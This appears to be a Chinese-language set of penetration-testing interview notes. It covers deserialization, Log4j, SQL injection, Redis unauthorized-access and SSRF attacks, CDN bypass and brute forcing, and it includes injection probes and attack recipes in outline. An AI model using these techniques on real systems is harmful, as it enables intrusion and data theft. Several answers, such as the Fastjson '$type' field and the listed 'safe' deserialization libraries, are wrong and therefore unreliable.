+<p>RMI 漏洞是指通过 RMI 机制存在的安全漏洞，通常是由于 RMI 服务的反序列化缺陷、权限问题或配置不当，导致攻击者能够远程执行不受控制的操作或命令。</p>
+<h4><strong>RMI 漏洞的原理是什么？(深信服)</strong></h4>
+<p>RMI 漏洞的根本原理通常与 Java 对象的反序列化有关。RMI 在接收远程调用时，可能会接收到一个恶意构造的对象。由于 Java 的反序列化机制，攻击者可以通过精心构造的恶意对象，使远程主机在反序列化过程中执行不安全的代码或操作。例如：</p>
+<ul>
+<li><strong>恶意对象反序列化</strong>：攻击者可能会构造一个恶意对象，并将其发送到 RMI 服务器，利用 Java 反序列化时执行恶意代码。</li>
+<li><strong>反射调用</strong>：攻击者可以利用反射机制在 RMI 服务端调用任意方法，从而远程执行系统命令或恶意操作。</li>
+</ul>
+<h4><strong>RMI 漏洞的攻击流程是怎样的？</strong></h4>
+<ol>
+<li><strong>攻击者构造恶意对象</strong>：攻击者首先构造一个恶意的 Java 对象，其中包含可以触发远程服务器执行恶意代码或命令的 payload（有效负载）。</li>
+<li><strong>恶意对象发送到 RMI 服务器</strong>：攻击者将该恶意对象通过 RMI 机制发送给目标服务器，RMI 服务器在反序列化该对象时执行攻击者预设的恶意代码。</li>
+<li><strong>执行恶意操作</strong>：通过反序列化或反射等机制，RMI 服务器可能会执行未授权的操作，如访问敏感信息、修改服务器配置、执行任意命令等。</li>
+</ol>
+<h4><strong>RMI 漏洞的常见攻击方式有哪些？</strong></h4>
+<ul>
+<li><strong>远程代码执行（RCE）</strong> ：通过构造恶意对象并通过 RMI 服务发送，攻击者能够在服务器上执行任意代码。</li>
+<li><strong>反序列化漏洞</strong>：RMI 服务器在处理不受信任的对象时，可能会触发不安全的反序列化，允许执行恶意代码。</li>
+<li><strong>权限提升</strong>：通过 RMI 调用未经过严格权限验证的敏感方法，攻击者可以提升自己在目标系统中的权限。</li>
+<li><strong>信息泄露</strong>：攻击者可以通过特定的 RMI 请求访问受保护的数据或资源。</li>
+</ul>
+<h4><strong>RMI 漏洞的防护措施有哪些？</strong></h4>
+<ul>
+<li><strong>限制 RMI 端口的访问</strong>：通过防火墙或网络访问控制策略，限制只有可信主机可以访问 RMI 服务端口。</li>
+<li><strong>使用 RMI 加密和认证</strong>：通过配置加密（如 SSL/TLS）和认证机制，确保只有经过验证的客户端才能与 RMI 服务交互。</li>
+<li><strong>禁用远程代码执行</strong>：限制 RMI 服务只允许受信任的代码进行反序列化操作，避免执行不受控制的代码。</li>
+<li><strong>加强反序列化安全</strong>：采用安全的反序列化框架（如 Apache Commons IO、Google Gson 等）来验证反序列化的数据是否合法，避免执行恶意对象。</li>
+<li><strong>最小化 RMI 服务暴露</strong>：仅暴露必要的 RMI 服务接口，并避免暴露敏感操作和权限提升相关的接口。</li>
+<li><strong>定期安全更新</strong>：及时安装 JDK 和相关库的安全更新，修补已知漏洞。</li>
+</ul>
+<h4><strong>RMI 漏洞中的反序列化攻击如何利用？</strong></h4>
+<ul>
+<li><strong>恶意对象注入</strong>：攻击者通过网络发送恶意对象，RMI 服务端在反序列化这些对象时，可能执行恶意的代码。</li>
+<li><strong>gadget 链攻击</strong>：攻击者构造包含多个链式调用的对象，利用 Java 的反射、序列化和反序列化机制，将恶意代码注入到程序中，使其在不引起怀疑的情况下执行。</li>
+</ul>
+<h4><strong>如何检测和缓解 RMI 漏洞？</strong></h4>
+<ul>
+<li><strong>审计 RMI 服务的接口和权限</strong>：检查和审计暴露的 RMI 服务，确保没有暴露危险的接口和操作。</li>
+<li><strong>启用 Java 安全管理器</strong>：启用 Java 安全管理器，并进行安全策略配置，限制 RMI 服务能够执行的操作。</li>
+<li><strong>使用对象签名</strong>：在反序列化过程中对对象进行签名验证，防止恶意对象被注入。</li>
+<li><strong>网络隔离</strong>：将 RMI 服务与外部网络隔离，确保只有授权的系统可以访问 RMI 服务。</li>
+</ul>
+<h4><strong>RMI 漏洞与反射攻击之间的关系是什么？</strong></h4>
+<p>反射攻击是 RMI 漏洞的一种常见利用方式。攻击者可以通过反射机制动态加载并调用目标类的方法，导致远程执行恶意代码或系统命令。利用 RMI 服务，攻击者可以通过构造恶意对象和调用反射方法来绕过安全机制，从而执行任意操作。</p>
+<h4>Fastjson漏洞原理、如何修复？</h4>
+<p>Fastjson是一款高性能的Java语言JSON处理库，广泛应用于Web开发、数据交换等领域。Fastjson默认支持AutoType特性，即可以通过“$type”字段来指定具体的类进行反序列化。<span data-type="text" style="color: var(--b3-font-color8);">攻击者可以构造恶意的JSON字符串，通过指定恶意类来执行任意代码。</span>在接收和处理<span data-type="text" style="color: var(--b3-font-color8);">JSON数据</span>时，需要对输入进行严格的验证和过滤。避免恶意JSON的注入。</p>
+<h4>Log4j常见漏洞原理、如何修复？</h4>
+<p>Log4j是一个<span data-type="text" style="color: var(--b3-font-color8);">Java日志记录库</span>，最著名的是Log4j 2中的JNDI注入漏洞。当Log4j在处理日志消息时，如果日志消息中包含<code>${}</code>​格式的字符串，<span data-type="text" style="color: var(--b3-font-color8);">并且该字符串被解释为JNDI（Java Naming and Directory Interface）查找</span>，那么攻击者就可以利用这个特性来注入恶意代码。通过构造特殊的JNDI资源，攻击者可以远程执行任意代码或触发其他安全漏洞。</p>
+<p>修复方法：1、更新Log4j版本，新版本有官方补丁。2、在Log4j的配置文件中禁用JDID查找。3、在处理用户输入的外部数据时要验证和过滤。避免将未经验证的数据直接传递给Log4j进行日志记录。</p>
+<h4>业务逻辑漏洞有哪些具体类型？</h4>
+<p>未授权访问、身份枚举、水平越权、垂直越权、</p>
+<h4>水平越权会发生在哪些位置？</h4>
+<p>1、数据库：攻击者可能通过修改URL参数或会话标识符来访问其他用户的敏感数据。2、API接口：攻击者可以通过构造特定的请求来访问或操作其他用户的数据。3、前端：攻击者可能通过修改页面上的隐藏字段值来访问其他用户的个人信息。4、如会话标识符容易被猜测或伪造，那么攻击者可能利用这些缺陷来模拟其他用户的会话，从而进行水平越权攻击。</p>
+<h4>水平越权有哪几种检测方式？</h4>
+<p>1、手工模拟检测。2、自动化测试工具，如Burp Suite、fiddler等模拟用户请求并自动检测潜在的漏洞。3、代码审计，关注数据查询、更新、删除等操作是否进行了正确的权限校验。4、日志分析，查找异常或可疑的访问行为。</p>
+<h4>如何判断是否有CDN?</h4>
+<ol>
+<li>通过nslookup命令进行检测，如果返回<span data-type="text" style="color: var(--b3-font-color10);">域名解析对应多个IP地址</span>多半是使用了CDN。</li>
+<li>利用在线网站进行全国多地区的ping服务器操作，查看这些ip是否一致。</li>
+<li>通过浏览器指纹插件查看是否有CDN服务商。</li>
+<li>通过在线cdn检测工具，或判断ip是否在cdn服务商的ip范围内。</li>
+</ol>
+<h4>如何绕过DNS找真实IP？</h4>
+<p>邮箱反查、国外访问、查询DNS历史解析记录有没有泄露IP、通过二级域名、网络空间搜索引擎，通过SSL证书获取、F5 LTM解码法、zmap扫描全网获取。</p>
+<h4>利用SSL证书获取真实IP的原理</h4>
+<ol>
+<li><strong>扫描端口443</strong>：攻击者可以扫描整个互联网上的IP地址，并尝试在端口443（HTTPS默认的端口）上建立SSL连接。由于许多Web服务器在端口443上运行，并且配置了SSL证书，因此攻击者可以通过这种方式发现哪些IP地址上运行着Web服务器。</li>
+<li><strong>获取SSL证书</strong>：当攻击者与一个IP地址上的Web服务器建立SSL连接时，服务器会发送其SSL证书给攻击者。攻击者可以分析这个证书，以获取其中包含的域名信息。</li>
+<li><strong>反查DNS记录</strong>：攻击者可以使用从SSL证书中获取的域名信息，通过DNS查询来找到这些域名对应的IP地址。由于DNS查询会返回域名对应的IP地址，因此攻击者可以通过这种方式来验证和确认目标服务器的真实IP地址。</li>
+</ol>
+<h4>如何找到某个人的联系方式？</h4>
+<p>微博私信、知乎、搜索引擎、公众号、天眼查、whois</p>
+<h4>SESSION和Cookie的区别？cookie(客小)session(服大)</h4>
+<p>1、Cookie是存储在客户端、Session则是存储在服务器端。</p>
+<p>2、Cookie可以存储少量通常不超过4KB数据，它不适合存储大量数据。Session不受客户端存储空间的限制。</p>
+<p>3、Cookie的生命周期由Expires或Max-Age属性决定。Cookie将在指定的时间后过期；如果没有设置，浏览器关闭时失效。Session的生命周期则由服务器控制。当用户关闭浏览器或一定时间没有活动时，Session会自动过期。Session的过期时间可以通过服务器配置进行设置。</p>
+<h4>三次握手四次挥手原理？</h4>
+<p>第一次握手：建立连接时,客户端发送syn包(syn=j)到服务器,并进入SYN_SEND状态,等待服务器确认</p>
+<p>第二次握手：服务器收到syn包,必须确认客户的SYN（ack=j+1）,同时自己也发送一个SYN包（syn=k）,即SYN+ACK包,此时服务器进入SYN_RECV状态</p>
+<p>第三次握手：客户端收到服务器的SYN＋ACK包,向服务器发送确认包ACK(ack=k+1),此包发送完毕,客户端和服务器进入ESTABLISHED状态,完成三次握手</p>
+<p>四次挥手过程</p>
+<p>第一次挥手,客户端向服务端发送报文,请求关闭数据传送,并进入等待状态</p>
+<p>第二次挥手,服务端收到报文后,发送ACK确认,此时客户端到服务端的链接断开</p>
+<p>第三次挥手,服务端数据传输完毕后,向客户端发送报文,请求关闭数据,并进入等待状态</p>
+<p>第四次挥手,客户端收到报文后,发送确认报文,链接完全断开</p>
+<h4>SQL注入的种类？</h4>
+<p>提交方式：get、post、cookie注入</p>
+<p>注入参数类型分：字符型、数字型、搜索型</p>
+<p>从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、宽字节注入</p>
+<h4>SQL注入防御方法</h4>
+<p>1、使用安全的API 。 2、使用正则表达式提交字符串过滤、采用前端加服务端过滤。  3、使用安全函数，对敏感字符进行转义</p>
+<p>4、不显示数据库错误。5、预编译。6、最小权限，只给访问数据库的WEB应用最小权限。7、重要信息加密储存。8、使用安全防护产品。</p>
+<h4>介绍下你的SQL注入流程</h4>
+<p>1、判断是否有回显，有回显尝试联合查询。2、无回显查看是否有数据库报错信息，有报错信息可以尝试报错注入。3、无回显无报错信息，尝试盲注（时间和布尔）</p>
+<h4>SQL注入写shell的条件?</h4>
+<p>1、当前用户具有写得权限。2、找到网站绝对路径。3、网站有可写目录。3、Mysql的配置secure_file_priv为空。</p>
+<h4>OSI 的七层模型都有哪些?</h4>
+<ol>
+<li>物理层：OSI模型的最低层，包括物理连网媒介，为上层协议提供一个传输数据的物理媒体。协议数据单元为比特（bit），常见的物理设备有集线器、中继器、网线、调制解调器、网卡等，常见协议有RS-232、V.35、RJ-45、FDDI等。</li>
+<li>数据链路层：负责建立、维护和终止节点间的链路连接，以及数据的传输和错误检测。协议数据单元为帧（frame），常见的物理设备有网桥、二层交换机等，常见协议有IEEE802.3/.2、HDLC、PPP、ATM等。</li>
+<li>网络层：负责将数据包从源端路由到目的端，实现不同网络之间的通信。协议数据单元为数据包（packet），常见的物理设备有路由器、防火墙、三层交换机等，常见协议有IP、ICMP、IGMP、IPX、ARP、RARP、BGP、RIP等。</li>
+<li>传输层：提供端到端的通信服务，确保数据的完整性和可靠性。协议数据单元为数据段（segment），常见的协议有TCP、UDP、RTP、SCTP、SPX等。</li>
+<li>会话层：负责建立、管理和终止会话连接，以及会话过程中的数据交换。常见的协议有RPC、SQL、NFS等。</li>
+<li>表示层：负责数据的表示、安全、压缩等功能，确保数据在发送和接收端之间的正确理解和处理。常见的格式有JPEG、ASCII、GIF、DES、MPEG等，常见的协议有LPP（轻量级表示协议）等。</li>
+<li>应用层：为用户和应用程序提供网络服务接口，支持各种网络应用。常见的协议有HTTP、FTP、TFTP、SMTP、DHCP、Telnet、DNS、SNMP、SSH、WWW、POP3等。</li>
+</ol>
+<h4>redis如何攻击？</h4>
+<p>1、未授权访问：redis可能允许任何IP的连接，攻击者可以连接redis执行命令。如读取、修改、删除数据等。</p>
+<p>2、命令注入：在构建redis命令时候没有充分的输入校验可以注入恶意命令操纵服务器。</p>
+<p>3、缓冲区溢出：可以利用其他软件或组件的缓冲区溢出漏洞攻击redis。</p>
+<p>4、持久化漏洞：如果可以访问redis的持久化文件中的漏洞来恢复数据或执行恶意代码。</p>
+<h4>redis未授权访问</h4>
+<ol>
+<li>写webdhell</li>
+<li>写公钥</li>
+<li>主从复制</li>
+<li>定时任务</li>
+</ol>
+<h4>请求包的组成？</h4>
+<p>1、请求行  request method  、URI（统一资源标识符）HTTP version</p>
+<p>2、请求头  host、ua、accept、accept-language、accept-encoding、connection、cookie</p>
+<p>3、空行</p>
+<p>4、请求体</p>
+<h4>目录扫描工具有哪些？</h4>
+<p><span data-type="text" style="color: var(--b3-font-color8);">Dirmap</span>、御剑、DirBuster、Dirsearch、AWVS、wwwscan</p>
+<h4>有哪些漏洞扫描工具？</h4>
+<p>AWVS、OWASP、BurpSuite-Scanner功能、nmap、北极熊</p>
+<h4>遇到搜索框你如何去找sql注入漏洞?</h4>
+<h4>sql注入绕waf方法?</h4>
+<p>1.使用SQL注释符号（如--、//、#）来隐藏恶意SQL代码。2.大小写绕过。3.特殊字符绕过。4.逻辑漏洞绕过。</p>
+<h4>用了cdn之后用户向网站发起的请求的流程是什么样的？</h4>
+<ol>
+<li>用户通过浏览器或应用程序向服务器发送HTTP请求。</li>
+<li>请求首先到达CDN的边缘节点（最接近用户的节点）。</li>
+<li>边缘节点向源站发送请求，获取目标资源。</li>
+<li>源站收到请求后，向边缘节点发送目标数据。</li>
+<li>边缘节点将数据存储在缓存中，以便更快速地提供给其他用户。</li>
+<li>边缘节点通过CDN将目标数据发送给请求数据的用户。</li>
+</ol>
+<h4>Redis无web、Redis没回显怎么办？</h4>
+<p>可以尝试利用Redis的pub/sub功能或其他Redis命令来间接获取数据，或者结合其他漏洞（如SSRF）来访问Redis服务。</p>
+<h4>安全加固怎么定位？</h4>
+<p>安全加固需要首先进行风险评估，识别系统中的漏洞和弱点，然后制定相应的加固措施，如更新补丁、修改配置、加强访问控制等。</p>
+<h4>绕过CDN找真实IP的方法有哪些？</h4>
+<p>多地ping、国外ping、可以通过分析DNS记录、使用工具查询IP地址、观察网站响应头中的信息或利用已知漏洞来绕过CDN并找到真实IP地址。</p>
+<h4>用什么工具来进行端口扫描？</h4>
+<p>常用的端口扫描工具包括Nmap、netcat、masscan等。</p>
+<h4>平时目录扫描用到什么工具？</h4>
+<p>常用的目录扫描工具包括DirBuster、Dirsearch、Gobuster等。</p>
+<h4>用Python编写了哪些脚本？</h4>
+<p>编写了自动化测试脚本、数据抓取脚本、漏洞验证脚本等。</p>
+<h4>信息收集打点如何进入后台以及后台页面如何找到的？</h4>
+<p>通过搜索引擎、社交媒体、漏洞库等渠道收集目标系统的信息，然后使用工具或手动分析来找到后台登录页面。</p>
+<h4>在Linux中如何定位进程的可执行文件地址？</h4>
+<p>可以使用<code>ls -l /proc/[pid]/exe</code>​或<code>readlink -f /proc/[pid]/exe</code>​命令来定位进程的可执行文件地址。</p>
+<h4>sqlmap -u的意义是什么？</h4>
+<p>​<code>sqlmap -u</code>​用于指定要测试的URL。</p>
+<h4>level3和level5的区别是什么？</h4>
+<p>sqlmap的level参数用于控制测试的深度和广度，level3增加了对用户代理（User-Agent）和引用页（Referer）头部的检测。level3比level5的测试范围更窄，但可能更快速。level5最高级别的测试等级，会尝试使用所有可用的技术和方法进行扫描和利用，包括自动破解cookie、X-Forwarded-For（XFF）等头部注入。包含了sqlmap中所有的payload，能够进行全面而深入的扫描，以发现潜在的注入点。</p>
+<h4>数据库增删改查对应的关键字是什么？</h4>
+<p>增（Insert）、删（Delete）、改（Update）、查（Select）。</p>
+<h4>常见的命令执行函数（PHP）有哪些？</h4>
+<p>包括<code>exec()</code>​、<code>shell_exec()</code>​、<code>system()</code>​、<code>passthru()</code>​、popen()等。</p>
+<h4>谷歌语法有哪些？</h4>
+<p>常用的谷歌语法包括<code>site:</code>​、<code>inurl:</code>​、<code>intitle:</code>​、<code>filetype:</code>​等。</p>
+<h4>存储型跨站脚本如何利用？</h4>
+<p>存储型跨站脚本漏洞可以通过在目标网站上插入恶意脚本，当其他用户访问该页面时执行恶意脚本。</p>
+<h4>Python爬虫用到哪些库？</h4>
+<p>常用的Python爬虫库包括requests、BeautifulSoup、Scrapy等。</p>
+<h4>request里如何发送GET和POST请求？</h4>
+<p>使用<code>requests.get(url)</code>​发送GET请求，使用<code>requests.post(url, data=payload)</code>​发送POST请求。</p>
+<h4>爆破SSH如何爆破？参数是什么？</h4>
+<p>可以使用工具如Hydra、Medusa等进行SSH爆破，参数包括目标IP地址、端口号、用户名列表和密码列表等。</p>
+<h4>出现报错信息如何利用？</h4>
+<p>可以分析报错信息中的敏感信息，如数据库错误信息、文件路径等，来构造攻击语句。</p>
+<h4>熟悉哪些网络空间搜索引擎？</h4>
+<p>熟悉的网络空间搜索引擎包括Fofa、ZoomEye、Shodan等。</p>
+<h4>Fofa如何通过相关IP找资产？</h4>
+<p>可以使用Fofa的搜索语法，如<code>ip="x.x.x.x"</code>​来查找相关IP地址的资产信息。</p>
+<h4>IIS7.0有什么漏洞？</h4>
+<p>IIS7.0存在多个漏洞，如安全补丁未及时更新导致的漏洞、配置不当导致的漏洞等。</p>
+<h4>中间件Apache Tomcat IIS Nginx的区别是什么？</h4>
+<ul>
+<li>Apache:简单、速度快、性能稳定，支持SSL技术、多个虚拟主机，以及代理服务器功能。常用于托管静态网页和轻量级动态网站，适合需要高稳定性和广泛兼容性的场景。</li>
+<li>tomcat:专注于Java应用的部署和运行,适用于Java Web应用的开发和部署，特别是需要处理复杂Java逻辑和动态内容的网站。</li>
+<li>IIS:与Windows系统深度集成，支持多种协议，包括HTTP、HTTPS、FTP、SMTP等适合在Windows环境下运行，特别是与微软其他产品（如.NET框架、<a href="http://ASP.NET" target="_blank" rel="noopener noreferrer">ASP.NET</a>）紧密集成的场景。</li>
+<li>Nginx:占有内存少，并发能力强--适用于需要处理高并发请求、提供反向代理和负载均衡服务的场景，如大型网站、电商平台等。</li>
+</ul>
+<h4>对小程序如何进行渗透测试？</h4>
+<p>小程序渗透测试需要分析小程序的代码、接口、数据存储等方面，发现潜在的安全漏洞。</p>
+<h4>文件包含漏洞产生的原因是什么？</h4>
+<p>文件包含漏洞通常是由于应用程序在处理用户输入时没有进行充分的验证和过滤导致的。</p>
+<h4>文件包含漏洞常见的四个函数是什么？（知道创宇）</h4>
+<p>常见的文件包含函数包括<code>include()</code>​、<code>require()</code>​、<code>include_once()</code>​和<code>require_once()</code>​。</p>
+<h4>include、include_once、require、 require_once区别? （）</h4>
+<p>1、require()和require_once()函数：</p>
+<p>require()函数<strong>引入文件不存在时，将立即退出程序；文件已经存在时，则还是会重复的引入</strong></p>
+<p>require_once()只包含一次</p>
+<p>2、include() 函数和include_once()函数</p>
+<p>include()函数引入文件不存在时，不会立即退出程序，会继续向下执行；当文件已经存在时，则还是会重复的引入</p>
+<p>include_once()只包含一次。</p>
+<h4>如何使用谷歌语法找网站后台？</h4>
+<p>可以使用谷歌语法如<code>site:example.com intitle:login</code>​来查找目标网站的后台登录页面。</p>
+<h4>Redis未授权漏洞在有web服务的情况下如何利用？</h4>
+<p>可以利用Redis未授权漏洞进行数据库读写、文件读写、命令执行等操作，进而控制整个系统。</p>
+<h4>如何用谷歌语法搜寻Tomcat页面？</h4>
+<p>可以使用谷歌语法如<code>intitle:"Apache Tomcat"</code>​来搜索Tomcat页面。</p>
+<h4>通过Redis拿Webshell的前提条件是什么？</h4>
+<p>需要目标系统存在Redis未授权漏洞，并且Redis服务可以访问到目标系统的文件系统。</p>
+<h4>反序列化漏洞原理是什么？</h4>
+<p>反序列化漏洞是由于应用程序在处理反序列化数据时没有进行充分的验证和过滤导致的，攻击者可以构造恶意的序列化数据来执行任意代码。</p>
+<h4>IIS6.0和IIS7.0有什么区别？</h4>
+<p>IIS6.0和IIS7.0在性能、安全性、管理等方面存在差异，IIS7.0引入了模块化设计，提高了安全性和可维护性。</p>
+<h4>什么是CDN？</h4>
+<p>CDN是内容分发网络（Content Delivery Network）的缩写，它通过在网络中部署多个节点来提高网站的访问速度和可用性。</p>
+<h4>Nmap全端口扫描指令是什么？</h4>
+<p>Nmap全端口扫描指令为<code>nmap -p- target</code>​，其中<code>target</code>​为目标IP地址或域名。</p>
+<h4>你用过哪些安全服务设备？</h4>
+<p>用过的安全服务设备包括防火墙、入侵检测系统（IDS）、入侵防御系统（IPS）等。</p>
+<h4>JS如何获取Cookie？</h4>
+<p>可以使用<code>document.cookie</code>​来获取当前页面的Cookie信息。</p>
+<h4>文件包含漏洞如何利用？（深信服）</h4>
+<p>可以利用文件包含漏洞读取系统文件、执行任意代码或包含恶意文件。</p>
+<h4>谷歌语法如何搜索后台管理页面？</h4>
+<p>可以使用谷歌语法如<code>intitle:login</code>​、<code>intext:admin</code>​等来搜索后台管理页面。</p>
+<h4><strong>DICT协议和Gopher协议有什么区别？（深信服）</strong></h4>
+<p><strong>DICT协议</strong>是一个网络协议，允许用户查询字典或词典数据。它通过客户端和远程字典服务器之间的请求与响应机制提供词汇定义、同义词、翻译等信息。DICT协议通常用于提供词典服务或文本查询服务，专注于简洁的文本查询。</p>
+<p><strong>Gopher协议</strong>是早期的互联网协议，主要用于通过分层的菜单系统获取和分享信息。用户可以浏览菜单、访问存储在不同主机上的文件和文档。Gopher协议的设计相对简单，支持文件传输和层次化的菜单选择系统，允许用户逐步进入更深层次的内容。</p>
+<p><strong>区别</strong>：</p>
+<ul>
+<li><strong>目的与应用领域</strong>：DICT协议主要用于字典查询，提供词汇定义和相关信息；Gopher协议则是一个更通用的信息分发协议，支持各种类型的文件、文档和菜单访问。</li>
+<li><strong>数据访问方式</strong>：DICT协议通过查询和响应机制进行交互，专注于文本查询；Gopher协议通过层级菜单系统逐步进入具体内容，支持文件和文档传输。</li>
+<li><strong>协议复杂性</strong>：DICT协议较为简单，主要用于字典查询；Gopher协议支持复杂的文件管理和多层次菜单系统。</li>
+<li><strong>协议现代化</strong>：DICT协议在现代仍有一定应用，尤其是在在线词典服务中；Gopher协议随着HTTP和Web的普及逐渐被淘汰，现代互联网中已经不再广泛使用。</li>
+<li><strong>交互方式</strong>：DICT协议主要是文本交互；Gopher协议则依赖菜单驱动式的交互。</li>
+</ul>
+<h4>Redis结合Gopher协议如何利用？</h4>
+<p>可以利用Redis未授权漏洞和Gopher协议进行SSRF攻击，进而访问内网资源或进行远程命令执行。</p>
+<h4><strong>如果遇到需要认证的Redis，如何进行SSRF攻击？（深信服）</strong></h4>
+<p>在Redis服务需要认证的情况下，进行SSRF攻击时需要绕过认证机制并成功连接到Redis服务器。通常Redis的认证通过密码来进行验证，攻击者需要知道正确的密码才能执行命令。</p>
+<p><strong>处理方法</strong>：</p>
+<ul>
+<li><strong>通过SSRF获取认证信息</strong>：首先，利用SSRF漏洞向Redis服务器发送请求，尝试通过请求内部资源或服务来获取Redis的认证信息，例如从Redis配置文件或环境变量中读取密码。</li>
+<li><strong>利用弱密码或默认密码</strong>：如果Redis没有开启强认证或使用默认配置（如默认密码），攻击者可以尝试使用常见的默认密码（如<code>password</code>​，<code>123456</code>​等）进行认证。</li>
+<li><strong>字典攻击或暴力破解</strong>：如果密码未知且Redis密码较弱，可以利用字典攻击或暴力破解方法来获取密码。攻击者可以通过SSRF请求暴力尝试密码，并观察Redis返回的错误信息。</li>
+<li><strong>利用Redis的认证错误响应</strong>：Redis会在认证失败时返回错误信息，攻击者可以通过返回的错误信息来推测密码的强度，从而逐步进行猜解。</li>
+</ul>
+<h4>IAM和LLM是什么？</h4>
+<p>IAM是身份和访问管理（Identity and Access Management）的缩写，用于管理用户的身份和访问权限。LLM可能是指某种特定的技术或概念，需要具体上下文来确定。</p>
+<h4>服务器IP地址一直在变可能用了什么措施？</h4>
+<p>服务器IP地址一直在变可能是由于使用了CDN、负载均衡、动态IP等技术或措施导致的。</p>
+<h4>加密字符串不像MD5你有什么想法？</h4>
+<p>如果加密字符串不像MD5，可能是使用了其他加密算法或进行了额外的处理，可以尝试分析加密字符串的上下文和可能的加密方式。</p>
+<h4>AES加密字符串应该怎么办？</h4>
+<p>如果抓到的字符串是AES加密的，可以尝试使用AES解密工具或库来解密，但需要知道密钥和加密模式等信息。</p>
+<h4>Shiro中Cookie进行了什么处理？</h4>
+<p>Shiro在处理RememberMe Cookie时通常会进行序列化和加密处理。</p>
+<h4>Remember Me存储在Cookie里如何解？</h4>
+<p>要解密Remember Me Cookie中的信息，需要知道加密密钥和加密算法以及序列化对象的格式。</p>
+<h4>常用端口有哪些？</h4>
+<p>常用端口包括HTTP（80）、HTTPS（443）、SSH（22）、FTP（21）、Telnet（23）等。</p>
+<h4>Sql注入的类型有哪些？ (奇安信、探探)</h4>
+<p>口诀：三字两请两头忙（盲）、搜哭(cookie)联报爹(叠)</p>
+<p>三字（数字型、字符型、宽字节）请求类型（GET型、POST型、）HTTP头（User-Agent、Referer）、盲注（布尔盲注、时间盲注）cookie、搜索型、联合查询、堆叠查询、报错、</p>
+<h4>布尔盲注原理？(探探)</h4>
+<p>布尔型盲注是SQL注入的一种类型，攻击者<strong>无法直接看到查询的结果数据，</strong> 但可以通过构造<strong>返回真假结果</strong>的布尔表达式，来判断查询是否成立。通过反复发出不同的布尔条件（如 <code>AND 1=1</code>​ 或 <code>AND 1=2</code>​），<u>攻击者通过观察应用程序返回的响应来推测数据库的结构和数据内容。</u></p>
+<h4>布尔型盲注利用方法? （探探）</h4>
+<ol>
+<li>攻击者通过发送带有布尔表达式的请求，例如：<code>' AND 1=1</code>​（为真）或 <code>' AND 1=2</code>​（为假）。</li>
+<li>根据返回的页面响应判断布尔表达式的真假。例如，如果页面没有变化，说明布尔条件为真；反之，说明布尔条件为假。</li>
+<li>通过不断修改条件，攻击者逐步获取数据库的结构、表名、字段名，最终提取敏感数据。这个过程通常是自动化的，利用脚本进行字符逐步猜测，最终暴露数据。</li>
+</ol>
+<h4>布尔盲注如何提高效率？</h4>
+<p>使用二分法或逐字符猜测来缩小范围，利用数据库特性（如数据库版本、表名长度等）来减少猜测次数，以及使用自动化工具或脚本进行批量猜测等。</p>
+<h4>中间件漏洞的特点？</h4>
+<p>中间件漏洞的特点通常包括：漏洞影响范围广泛，因为中间件通常被多个应用或服务所使用；漏洞利用方式多样，可能涉及代码执行、数据泄露、拒绝服务等；以及漏洞修复和更新滞后，因为中间件的更新和维护需要时间和资源。</p>
+<h4>如何防御命令执行函数？</h4>
+<p>防御命令执行函数的方法包括：限制用户输入，避免用户输入直接作为命令执行；使用安全的API替代不安全的命令执行函数；对输入进行严格的验证和过滤；以及使用最小权限原则，限制执行命令的权限等。</p>
+<h4>图片码没有解析怎么办？</h4>
+<p>如果图片码没有解析，可以尝试以下方法：检查图片码的格式和编码是否正确；使用专业的图片解码工具或库进行解析；检查解析代码是否存在逻辑错误或异常处理不当等问题。</p>
+<h4>文件上传漏洞如何进行测试？</h4>
+<p>测试文件上传漏洞的方法包括：尝试上传不同类型的文件（如图片、脚本、压缩包等），观察是否能够成功上传并解析；检查上传的文件是否被存储在预期的位置，以及是否可以被访问和执行；尝试绕过上传限制（如文件大小、类型、命名规则等）进行上传测试。</p>
+<h4>ARP攻击原理？</h4>
+<p>ARP攻击的原理是通过伪造ARP请求和应答来欺骗局域网内的其他设备，使其将攻击者的MAC地址与网关或其他设备的IP地址关联起来，从而实现中间人攻击、数据窃取、会话劫持等恶意行为。</p>
+<h4>如何确保远程访问中的安全？</h4>
+<p>确保远程访问中的安全可以采取以下措施：使用强密码和身份验证机制；使用安全的通信协议（如SSH、HTTPS等）；限制远程访问的权限和范围；定期更新和修补远程访问软件和系统；以及监控和记录远程访问日志等。</p>
+<h4>什么是VPN？</h4>
+<p>VPN（虚拟私人网络）是一种通过公共网络建立加密通道的技术，用于实现远程用户或分支机构与内部网络的安全连接和数据传输。</p>
+<h4>主流的防火墙有哪些？</h4>
+<p>主流的防火墙包括：硬件防火墙（如Cisco、Juniper等品牌的防火墙产品）；软件防火墙（如Windows防火墙、Linux iptables等）；以及云防火墙（如AWS WAF、Azure Firewall等）等。</p>
+<h4>python发起请求需要用到什么库？</h4>
+<p>Python发起请求通常使用<code>requests</code>​库，它是一个简单易用的HTTP库，支持各种HTTP请求方法（如GET、POST、PUT、DELETE等）和高级功能（如会话管理、Cookie处理、重定向等）。</p>
+<h4><strong>什么是反序列化？（深信服）</strong></h4>
+<p>反序列化是将序列化后的字节流或文本数据转换回原始对象的过程。序列化是将对象转换为字节流以便存储或传输，而反序列化则是将这些字节流或文本数据恢复为内存中的对象。</p>
+<h4><strong>反序列化和序列化的关系是什么？</strong></h4>
+<p>序列化和反序列化是互为逆操作。序列化将对象转换为字节流，而反序列化则是将字节流恢复为对象。二者共同作用于数据传输和存储中，保证对象在不同环境中得以还原和重构。</p>
+<h4><strong>反序列化过程中可能存在哪些安全问题？</strong></h4>
+<p>反序列化时可能会引发安全漏洞，例如反序列化漏洞。攻击者可以通过发送恶意构造的数据流来触发代码执行、进行数据篡改或发起拒绝服务攻击（DoS）。最严重的风险是远程代码执行（RCE），这使得攻击者能够在目标系统上执行任意代码。</p>
+<h4><strong>常见的反序列化数据格式有哪些？</strong></h4>
+<p>常见的反序列化格式包括：</p>
+<ul>
+<li><strong>JSON</strong>：广泛用于Web服务中的数据交换，易于阅读和解析。</li>
+<li><strong>XML</strong>：一种标记语言，也常用于不同系统间的数据交换。</li>
+<li><strong>Protobuf</strong>：Google的协议缓冲格式，常用于高效的数据序列化。</li>
+<li><strong>Java对象序列化</strong>：Java特有的格式，用于将Java对象转换为字节流。</li>
+</ul>
+<h4><strong>如何防止反序列化攻击？</strong></h4>
+<p>防止反序列化攻击的方法包括：</p>
+<ul>
+<li>进行<strong>类白名单</strong>检查，只允许特定的类进行反序列化。</li>
+<li>使用安全的反序列化库，验证数据合法性。</li>
+<li>对反序列化的数据进行<strong>验证和清洗</strong>，确保其不包含恶意代码。</li>
